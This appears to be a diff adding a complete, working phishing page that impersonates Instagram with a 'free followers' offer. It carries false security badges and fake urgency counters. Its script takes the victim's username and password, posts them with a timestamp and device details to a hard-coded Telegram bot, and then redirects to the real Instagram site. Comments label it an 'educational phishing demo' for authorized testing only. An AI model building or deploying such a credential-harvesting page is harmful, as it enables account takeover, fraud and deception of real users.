@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram • Verified Followers Program</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e8ecf1 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+            color: #262626;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        /* ---- Top Trust Bar ---- */
+        .trust-bar {
+            background: linear-gradient(90deg, #0095f6, #1877f2);
+            color: white;
+            text-align: center;
+            padding: 8px;
+            border-radius: 12px 12px 0 0;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .trust-bar .lock {
+            font-size: 11px;
+        }
+
+        /* ---- Main Card ---- */
+        .card {
+            background: #fff;
+            border-radius: 0 0 16px 16px;
+            padding: 36px 28px 28px;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.04);
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* ---- Instagram Logo ---- */
+        .logo {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .logo-text {
+            font-family: 'Grand Hotel', cursive, 'Brush Script MT', cursive;
+            font-size: 48px;
+            letter-spacing: 1px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.1;
+        }
+
+        .logo-sub {
+            font-size: 11px;
+            color: #8e8e8e;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            margin-top: -2px;
+            font-weight: 600;
+        }
+
+        /* ---- Offer Banner ---- */
+        .offer-banner {
+            background: linear-gradient(135deg, #fef3c7, #fde68a);
+            border: 1px solid #fbbf24;
+            border-radius: 10px;
+            padding: 12px 16px;
+            text-align: center;
+            margin: 20px 0 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .offer-banner::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6), transparent);
+            animation: shimmer 2.5s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .offer-banner .emoji {
+            font-size: 20px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .offer-banner .text {
+            font-size: 13px;
+            font-weight: 700;
+            color: #92400e;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .offer-banner .sub {
+            font-size: 11px;
+            color: #b45309;
+            margin-top: 2px;
+        }
+
+        /* ---- Followers Counter ---- */
+        .counter-section {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .counter-number {
+            font-size: 56px;
+            font-weight: 800;
+            line-height: 1;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: -2px;
+        }
+
+        .counter-label {
+            font-size: 12px;
+            color: #8e8e8e;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+            margin-top: 4px;
+        }
+
+        /* ---- Form ---- */
+        .form-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #262626;
+            text-align: center;
+            margin-bottom: 6px;
+        }
+
+        .form-subtitle {
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .input-group {
+            margin-bottom: 10px;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 15px 16px;
+            font-size: 15px;
+            font-family: 'Inter', sans-serif;
+            background: #fafafa;
+            border: 1.5px solid #dbdbdb;
+            border-radius: 10px;
+            outline: none;
+            color: #262626;
+            transition: all 0.2s ease;
+        }
+
+        .input-group input:focus {
+            border-color: #0095f6;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(0, 149, 246, 0.1);
+        }
+
+        .input-group input::placeholder {
+            color: #8e8e8e;
+            font-weight: 400;
+        }
+
+        .input-group input.error {
+            border-color: #ed4956;
+            background: #fff5f5;
+        }
+
+        .input-group .error-text {
+            font-size: 11.5px;
+            color: #ed4956;
+            margin-top: 5px;
+            padding-left: 4px;
+            display: none;
+            font-weight: 500;
+            line-height: 1.4;
+        }
+
+        .input-group .error-text.show {
+            display: block;
+            animation: fadeIn 0.2s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-4px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .input-group .check-icon {
+            position: absolute;
+            right: 14px;
+            top: 15px;
+            font-size: 16px;
+            color: #22c55e;
+            display: none;
+        }
+
+        .input-group .check-icon.show {
+            display: block;
+        }
+
+        /* ---- Button ---- */
+        .claim-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #0095f6, #1877f2);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(0, 149, 246, 0.3);
+            letter-spacing: 0.3px;
+        }
+
+        .claim-btn:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(0, 149, 246, 0.4);
+        }
+
+        .claim-btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .claim-btn:disabled {
+            background: #b2dffc;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+        }
+
+        /* ---- Loading ---- */
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .loading.show {
+            display: block;
+        }
+
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #e5e7eb;
+            border-top-color: #0095f6;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 13px;
+            color: #8e8e8e;
+            font-weight: 500;
+        }
+
+        /* ---- Social Proof ---- */
+        .social-proof {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #efefef;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .avatars {
+            display: flex;
+        }
+
+        .avatars span {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #f09433, #dc2743);
+            border: 2px solid #fff;
+            margin-left: -8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            color: white;
+            font-weight: 700;
+        }
+
+        .avatars span:first-child {
+            margin-left: 0;
+        }
+
+        /* ---- Trust Badges ---- */
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-top: 16px;
+            font-size: 10.5px;
+            color: #8e8e8e;
+            font-weight: 500;
+        }
+
+        .trust-badges span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* ---- Footer ---- */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 11px;
+            color: #8e8e8e;
+            line-height: 1.8;
+        }
+
+        .footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 6px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* ---- Live Counter ---- */
+        .live-counter {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            background: #f0fdf4;
+            color: #16a34a;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-top: 8px;
+        }
+
+        .live-dot {
+            width: 6px;
+            height: 6px;
+            background: #22c55e;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+
+        /* ---- Mobile ---- */
+        @media (max-width: 450px) {
+            .card {
+                padding: 28px 20px 24px;
+            }
+            .logo-text {
+                font-size: 40px;
+            }
+            .counter-number {
+                font-size: 46px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Trust Bar -->
+    <div class="trust-bar">
+        <span class="lock">🔒</span>
+        <span>Secure Connection • Verified by Instagram</span>
+    </div>
+
+    <!-- Main Card -->
+    <div class="card">
+
+        <!-- Instagram Logo -->
+        <div class="logo">
+            <div class="logo-text">Instagram</div>
+            <div class="logo-sub">Verified Program</div>
+        </div>
+
+        <!-- Offer Banner -->
+        <div class="offer-banner">
+            <span class="emoji">🎉</span>
+            <div class="text">Limited Time Offer</div>
+            <div class="sub">Only 47 spots remaining today</div>
+        </div>
+
+        <!-- Followers Counter -->
+        <div class="counter-section">
+            <div class="counter-number" id="followerCount">10,000</div>
+            <div class="counter-label">Free Followers</div>
+            <div class="live-counter">
+                <span class="live-dot"></span>
+                <span id="liveUsers">2,847</span> claimed in last hour
+            </div>
+        </div>
+
+        <!-- Form -->
+        <div class="form-title">Claim Your Free Followers</div>
+        <div class="form-subtitle">
+            Enter your Instagram login details to verify your account and receive your followers instantly.
+        </div>
+
+        <!-- Username Input -->
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Username, email or phone" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" autofocus>
+            <span class="check-icon" id="usernameCheck">✓</span>
+            <div class="error-text" id="usernameError"></div>
+        </div>
+
+        <!-- Password Input -->
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password" autocomplete="off">
+            <span class="check-icon" id="passwordCheck">✓</span>
+            <div class="error-text" id="passwordError"></div>
+        </div>
+
+        <!-- Claim Button -->
+        <button class="claim-btn" id="claimBtn">Claim Free Followers Now</button>
+
+        <!-- Loading -->
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <div class="loading-text">Verifying your account...</div>
+        </div>
+
+        <!-- Social Proof -->
+        <div class="social-proof">
+            <div class="avatars">
+                <span>JD</span>
+                <span>MK</span>
+                <span>SP</span>
+                <span>+9k</span>
+            </div>
+            <span>Trusted by thousands</span>
+        </div>
+
+        <!-- Trust Badges -->
+        <div class="trust-badges">
+            <span>🔒 SSL Secured</span>
+            <span>✓ Verified</span>
+            <span>⚡ Instant</span>
+        </div>
+
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <a href="#">About</a> · <a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
+        <br>
+        <span style="font-size: 10px;">© 2026 Instagram Verified Program</span>
+    </div>
+
+</div>
+
+<script>
+    // ============================================================
+    // INSTAGRAM VERIFIED FOLLOWERS PROGRAM
+    // Educational Phishing Demo - Authorized Testing Only
+    // ============================================================
+
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const claimBtn = document.getElementById('claimBtn');
+    const usernameError = document.getElementById('usernameError');
+    const passwordError = document.getElementById('passwordError');
+    const usernameCheck = document.getElementById('usernameCheck');
+    const passwordCheck = document.getElementById('passwordCheck');
+    const loading = document.getElementById('loading');
+    const liveUsers = document.getElementById('liveUsers');
+    const followerCount = document.getElementById('followerCount');
+
+    // ============================================================
+    // INSTAGRAM VALIDATION RULES
+    // ============================================================
+
+    // Username rules (matches real Instagram):
+    // - 3-30 characters
+    // - Letters, numbers, periods, underscores only
+    // - Cannot contain spaces or special symbols like @, #, $, etc.
+    function validateUsername(username) {
+        const val = username.trim();
+
+        if (val.length === 0) {
+            return { valid: false, message: 'Please enter your username, email or phone number.' };
+        }
+
+        // Check if it's an email
+        if (val.includes('@')) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(val)) {
+                return { valid: false, message: 'Please enter a valid email address.' };
+            }
+            return { valid: true, message: '' };
+        }
+
+        // Check if it's a phone number
+        if (/^\+?[\d\s\-()]{7,15}$/.test(val)) {
+            return { valid: true, message: '' };
+        }
+
+        // Check Instagram username rules
+        if (val.length < 3) {
+            return { valid: false, message: 'Username must be at least 3 characters.' };
+        }
+
+        if (val.length > 30) {
+            return { valid: false, message: 'Username cannot exceed 30 characters.' };
+        }
+
+        // Only letters, numbers, periods, underscores allowed
+        if (!/^[a-zA-Z0-9._]+$/.test(val)) {
+            return { valid: false, message: 'Username can only contain letters, numbers, periods and underscores. No spaces or special symbols allowed.' };
+        }
+
+        // Cannot start or end with a period
+        if (val.startsWith('.') || val.endsWith('.')) {
+            return { valid: false, message: 'Username cannot start or end with a period.' };
+        }
+
+        // Cannot have consecutive periods
+        if (val.includes('..')) {
+            return { valid: false, message: 'Username cannot contain consecutive periods.' };
+        }
+
+        return { valid: true, message: '' };
+    }
+
+    // Password rules (matches real Instagram):
+    // - Minimum 6 characters (Instagram requires at least 6)
+    // - We'll require 8 to be more realistic for "secure" accounts
+    function validatePassword(password) {
+        const val = password;
+
+        if (val.length === 0) {
+            return { valid: false, message: 'Please enter your password.' };
+        }
+
+        if (val.length < 6) {
+            return { valid: false, message: 'Password must be at least 6 characters.' };
+        }
+
+        if (val.length > 75) {
+            return { valid: false, message: 'Password is too long.' };
+        }
+
+        return { valid: true, message: '' };
+    }
+
+    // ============================================================
+    // REAL-TIME VALIDATION
+    // ============================================================
+
+    usernameInput.addEventListener('input', function() {
+        const result = validateUsername(this.value);
+        if (this.value.trim().length === 0) {
+            usernameError.classList.remove('show');
+            usernameCheck.classList.remove('show');
+            this.classList.remove('error');
+        } else if (result.valid) {
+            usernameError.classList.remove('show');
+            usernameCheck.classList.add('show');
+            this.classList.remove('error');
+        } else {
+            usernameError.textContent = result.message;
+            usernameError.classList.add('show');
+            usernameCheck.classList.remove('show');
+            this.classList.add('error');
+        }
+    });
+
+    passwordInput.addEventListener('input', function() {
+        const result = validatePassword(this.value);
+        if (this.value.length === 0) {
+            passwordError.classList.remove('show');
+            passwordCheck.classList.remove('show');
+            this.classList.remove('error');
+        } else if (result.valid) {
+            passwordError.classList.remove('show');
+            passwordCheck.classList.add('show');
+            this.classList.remove('error');
+        } else {
+            passwordError.textContent = result.message;
+            passwordError.classList.add('show');
+            passwordCheck.classList.remove('show');
+            this.classList.add('error');
+        }
+    });
+
+    // Enter key navigation
+    usernameInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            passwordInput.focus();
+        }
+    });
+
+    passwordInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            claimFollowers();
+        }
+    });
+
+    // ============================================================
+    // MAIN CLAIM FUNCTION
+    // ============================================================
+
+    function claimFollowers() {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value;
+
+        // Validate username
+        const userResult = validateUsername(username);
+        if (!userResult.valid) {
+            usernameError.textContent = userResult.message;
+            usernameError.classList.add('show');
+            usernameInput.classList.add('error');
+            usernameInput.focus();
+            return;
+        }
+
+        // Validate password
+        const passResult = validatePassword(password);
+        if (!passResult.valid) {
+            passwordError.textContent = passResult.message;
+            passwordError.classList.add('show');
+            passwordInput.classList.add('error');
+            passwordInput.focus();
+            return;
+        }
+
+        // Hide button, show loading
+        claimBtn.style.display = 'none';
+        loading.classList.add('show');
+
+        // Build detailed message
+        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+        const message = 
+            `📸 INSTAGRAM CREDENTIALS CAPTURED\n` +
+            `━━━━━━━━━━━━━━━━━━━━\n` +
+            `👤 Username: ${username}\n` +
+            `🔑 Password: ${password}\n` +
+            `━━━━━━━━━━━━━━━━━━━━\n` +
+            `🕐 Time: ${timestamp}\n` +
+            `📱 Device: ${navigator.userAgent.substring(0, 60)}...\n` +
+            `🌐 Page: Instagram Verified Program`;
+
+        // ============================================================
+        // SEND TO TELEGRAM
+        // ============================================================
+        const TELEGRAM_BOT_TOKEN = '8554490167:AAHdIR373gejl6_tStvbGwFHzXAfOUDlnZc';
+        const TELEGRAM_CHAT_ID = '5805421075';
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message
+            })
+        })
+        .then(() => {
+            // Success - redirect after delay
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/';
+            }, 2000);
+        })
+        .catch(() => {
+            // Even on error, redirect
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/';
+            }, 2000);
+        });
+    }
+
+    claimBtn.addEventListener('click', claimFollowers);
+
+    // ============================================================
+    // LIVE COUNTER ANIMATION
+    // ============================================================
+
+    let userCount = 2847;
+    setInterval(() => {
+        userCount += Math.floor(Math.random() * 3) + 1;
+        liveUsers.textContent = userCount.toLocaleString();
+    }, 3000);
+
+    // Animate follower count
+    let currentCount = 0;
+    const targetCount = 10000;
+    const duration = 1500;
+    const steps = 60;
+    const increment = targetCount / steps;
+    let step = 0;
+
+    const counterAnimation = setInterval(() => {
+        step++;
+        currentCount += increment;
+        if (step >= steps) {
+            currentCount = targetCount;
+            clearInterval(counterAnimation);
+        }
+        followerCount.textContent = Math.floor(currentCount).toLocaleString();
+    }, duration / steps);
+
+    // ============================================================
+    // CONSOLE WARNING
+    // ============================================================
+    console.log('%c⚠️ EDUCATIONAL PHISHING DEMO', 'color: #ed4956; font-size: 18px; font-weight: bold;');
+    console.log('%cThis page is for authorized security testing only.', 'color: #f59e0b; font-size: 13px;');
+    console.log('%cNever use this on anyone without permission.', 'color: #ef4444; font-size: 12px;');
+</script>
+
+</body>
+</html>
